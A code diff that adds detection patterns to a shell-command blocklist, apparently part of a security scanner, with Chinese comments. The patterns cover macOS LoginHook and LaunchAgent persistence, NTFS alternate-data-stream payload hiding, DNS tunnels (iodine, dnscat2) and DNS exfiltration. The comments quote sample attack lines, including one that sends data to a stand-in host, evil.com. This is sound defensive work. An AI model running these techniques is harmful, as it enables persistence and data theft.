@@ -1402,6 +1402,33 @@ _CRITICAL_PATTERNS = [
     # pbpaste | nc / pbpaste | curl 把剪贴板内容外带 (剪贴板常含临时粘贴的密钥/令牌)。
     (r"\bpbpaste\b[^\n]*\|\s*(?:nc|ncat|netcat|curl|wget)\b",
      "pbpaste exfil (剪贴板内容经网络外带)"),
+    # ---- round26: macOS LoginHook (登录时以 root 执行恶意脚本, 持久化) ----
+    # `defaults write com.apple.loginwindow LoginHook /path/evil.sh` 让任意脚本在每次
+    # 登录时以 root 运行, 是 macOS 经典持久化后门。defaults read/list 是只读查询放行。
+    (r"\bdefaults\s+write\b[^\n]*\b(?:LoginHook|LogoutHook)\b",
+     "macOS Login/LogoutHook (登录/登出钩子持久化, root 执行)"),
+    # ---- round26: cp/mv 写入 LaunchAgents/LaunchDaemons (安装自启后门) ----
+    # L1019 只覆盖 `defaults write` 形态, 未覆盖 `cp evil.plist /Library/LaunchAgents/...`
+    # (把恶意 plist 直接放进自启目录 = 开机/登录自动执行)。read-only launchctl list 放行。
+    (r"\b(?:cp|mv|tee|install|ln)\b[^\n]*/Library/Launch(?:Agents|Daemons)/",
+     "install LaunchAgent/Daemon (写入 macOS 自启目录, 持久化)"),
+    # ---- round26: NTFS Alternate Data Stream 隐藏载荷 (C:\x.txt:stream) ----
+    # NTFS ADS 把恶意载荷藏进文件的备用数据流 (`file.exe > innocent.txt:malware`),
+    # 杀软只扫主数据流而漏检 ADS, 是 Windows 持久化/载荷隐藏手法。
+    (r">[^\n]*\.[A-Za-z0-9]{1,6}:[A-Za-z0-9_\-.]+\s*$|"
+     r"\b(?:type|copy|echo)\b[^\n]*\.[A-Za-z0-9]{1,6}:[A-Za-z0-9_\-.]{2,}",
+     "NTFS Alternate Data Stream (备用数据流隐藏载荷, 绕过杀软扫描)"),
+    # ---- round26: DNS 隧道工具 (iodine / dnscat2, DNS 通道建立 C2/外带) ----
+    # iodine 仅在**启动隧道**形态才拦 (`iodine [-fP] [-u user] nsdomain`)。
+    # 读取其配置文件 (`cat /etc/iodine.conf`) 属良性, 不能用裸 `\biodine\b` 误杀。
+    (r"\biodine(?:d)?\s+(?!-v\b)(?=[^\n]*\s-(?:f|P|u|t|c|p|l|D|I)\b|\S+\.(?:com|net|org|io|dev)\b)",
+     "iodine DNS tunnel (DNS 隧道建立 C2 通道/外带)"),
+    (r"\bdnscat2?\s", "dnscat2 DNS tunnel (DNS 隧道 C2)"),
+    # ---- round26: PowerShell DNS 外带 (Resolve-DnsName 内嵌命令替换作子域) ----
+    # `Resolve-DnsName $(cmd).evil.com` 把命令输出编码进 DNS 查询子域外带
+    # (Get-Content secret → base64 → DNS 查询)。普通 `Resolve-DnsName example.com` 放行。
+    (r"\bResolve-DnsName\b[^\n]*\$\(",
+     "PowerShell DNS exfil (Resolve-DnsName 内嵌命令替换作 DNS 子域外带)"),
 ]
 
 _HIGH_PATTERNS = [
